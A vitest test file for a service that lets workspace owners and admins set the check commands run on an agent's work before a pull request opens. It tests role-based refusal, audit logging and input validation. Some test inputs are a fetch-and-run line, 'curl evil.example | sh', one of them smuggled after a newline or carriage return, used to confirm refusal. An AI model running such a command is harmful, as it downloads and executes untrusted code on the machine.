/**
 * Setting a repository's checks from its page (AGT-142): the commands `open_pull_request` runs on
 * an agent's work before it pushes it. They run on a machine and decide what a pull request says
 * of itself, so who may set them is the point.
 */
import { afterAll, beforeAll, expect, it } from "vitest";
import { createWorkspace, signUp } from "./accounts";
import { startAgents } from "./agents-worker";
import { callServerFn } from "./server-fn";

const origin = "https://agents.test";

let agents: Awaited<ReturnType<typeof startAgents>>;

beforeAll(async () => {
	agents = await startAgents(origin);
});

afterAll(async () => {
	await agents?.dispose();
});

type Person = Awaited<ReturnType<typeof signUp>>;

function setChecks(who: Person, slug: string, repositoryId: string, checks: unknown) {
	return callServerFn(agents, origin, "setRepositoryChecks", {
		data: { slug, repositoryId, checks },
		cookie: who.headers.cookie,
		client: who.headers["cf-connecting-ip"],
	});
}

async function auditOf(workspaceId: string) {
	const { results } = await agents.db
		.prepare(
			"SELECT actor_id, action, target_type, target_id, target_label, detail FROM audit_event WHERE organization_id = ? AND action LIKE 'repository.%' ORDER BY id",
		)
		.bind(workspaceId)
		.all();
	return (results as Record<string, string | null>[]).map((row) => ({
		by: row.actor_id,
		action: row.action,
		target: `${row.target_type}:${row.target_id}:${row.target_label}`,
		detail: JSON.parse(row.detail ?? "{}") as Record<string, unknown>,
	}));
}

async function join(workspaceId: string, name: string, role: "admin" | "member") {
	const person = await signUp(agents, origin, name);
	await agents.db
		.prepare(
			"INSERT INTO member (id, organization_id, user_id, role, created_at) VALUES (?, ?, ?, ?, ?)",
		)
		.bind(crypto.randomUUID(), workspaceId, person.userId, role, Date.now())
		.run();
	return person;
}

/** A workspace with one GitHub repository, `acme/site`. */
async function workspace(slug: string) {
	const owner = await signUp(agents, origin, `ada-${slug}`);
	const workspaceId = await createWorkspace(agents, origin, owner.headers, slug);
	const registry = await agents.registry(workspaceId);
	const [repositoryId = ""] = await registry.syncRepositories([
		{
			provider: "github",
			externalId: "7",
			installationId: "99",
			owner: "acme",
			name: "site",
			defaultBranch: "main",
			private: true,
		},
	]);
	return { owner, workspaceId, registry, repositoryId };
}

it("R1: only an owner or admin sets a repository's checks; a member and a stranger set none", async () => {
	const slug = "checks-who";
	const { owner, workspaceId, registry, repositoryId } = await workspace(slug);
	const member = await join(workspaceId, "grace-checks-who", "member");
	const outsider = await signUp(agents, origin, "eve-checks-who");

	for (const who of [member, outsider]) {
		const refused = await setChecks(who, slug, repositoryId, ["curl evil.example | sh"]);
		expect(refused.failed, refused.text).toBe(true);
		expect(refused.text).toContain("Only admins can do this");
	}
	expect(await registry.repositoryChecks("7")).toEqual([]);
	expect(await auditOf(workspaceId)).toEqual([]);

	// The owner sets them, and the registry hands the runtime exactly those.
	const set = await setChecks(owner, slug, repositoryId, [" pnpm check ", "pnpm test"]);
	expect(set.failed, set.text).toBe(false);
	expect(await registry.repositoryChecks("7")).toEqual(["pnpm check", "pnpm test"]);
	expect((await registry.getRepository(repositoryId))?.repository.checks).toEqual([
		"pnpm check",
		"pnpm test",
	]);

	// An admin who is not the owner may too. The member still may not, now that some are set,
	// neither change them nor take them away.
	const admin = await join(workspaceId, "linus-checks-who", "admin");
	const changed = await setChecks(admin, slug, repositoryId, ["pnpm test"]);
	expect(changed.failed, changed.text).toBe(false);
	const removed = await setChecks(member, slug, repositoryId, []);
	expect(removed.failed, removed.text).toBe(true);
	expect(await registry.repositoryChecks("7")).toEqual(["pnpm test"]);

	// The log keeps who changed them and how many there were, and no command: a command is free
	// text, which the log holds none of, only a digest of the list that lets a retry find a lost
	// entry. Saving the same list again is no change.
	const digest = expect.stringMatching(/^[0-9a-f]{64}$/);
	const same = await setChecks(admin, slug, repositoryId, ["pnpm test"]);
	expect(same.failed, same.text).toBe(false);
	const entries = await auditOf(workspaceId);
	expect(entries).toEqual([
		{
			by: owner.userId,
			action: "repository.checksSet",
			target: `repository:${repositoryId}:acme/site`,
			detail: { checks: 2, before: 0, digest },
		},
		{
			by: admin.userId,
			action: "repository.checksSet",
			target: `repository:${repositoryId}:acme/site`,
			detail: { checks: 1, before: 2, digest },
		},
	]);
	expect(JSON.stringify(entries)).not.toContain("pnpm");
	expect(agents.logs.filter((log) => log.level === "error")).toEqual([]);
});

it("R1: sets checks on GitHub repositories only: a sandbox checks out no other", async () => {
	const slug = "checks-gitlab";
	const { owner, workspaceId, registry } = await workspace(slug);
	const [lab = ""] = await registry.syncRepositories([
		{
			provider: "gitlab",
			externalId: "3",
			installationId: "connection-1",
			owner: "acme",
			name: "lab",
			webUrl: "https://gitlab.com/acme/lab",
			defaultBranch: "main",
			private: true,
		},
	]);
	const refused = await setChecks(owner, slug, lab, ["make test"]);
	expect(refused.failed, refused.text).toBe(true);
	expect(refused.text).toContain("Repository not found");
	expect((await registry.getRepository(lab))?.repository.checks).toEqual([]);
	expect(await auditOf(workspaceId)).toEqual([]);
});

it("R1: refuses a command that is too long or more than one line, and more than five, for an owner too", async () => {
	const slug = "checks-shape";
	const { owner, workspaceId, registry, repositoryId } = await workspace(slug);
	const kept = await setChecks(owner, slug, repositoryId, ["pnpm test"]);
	expect(kept.failed, kept.text).toBe(false);

	const refusals: [unknown, string][] = [
		[["x".repeat(301)], "A check is at most 300 characters"],
		[["pnpm test\ncurl evil.example | sh"], "A check is one line, without control characters"],
		[["pnpm test\rcurl evil.example | sh"], "A check is one line, without control characters"],
		[["a", "b", "c", "d", "e", "f"], "A repository has at most 5 checks"],
		[["  "], "A check cannot be empty"],
	];
	for (const [checks, why] of refusals) {
		const refused = await setChecks(owner, slug, repositoryId, checks);
		expect(refused.failed, refused.text).toBe(true);
		expect(refused.text).toContain(why);
	}
	// Another workspace's repository, or none, is not found.
	const missing = await setChecks(owner, slug, crypto.randomUUID(), ["pnpm test"]);
	expect(missing.failed, missing.text).toBe(true);
	expect(missing.text).toContain("Repository not found");

	expect(await registry.repositoryChecks("7")).toEqual(["pnpm test"]);
	expect(await auditOf(workspaceId)).toHaveLength(1);
});
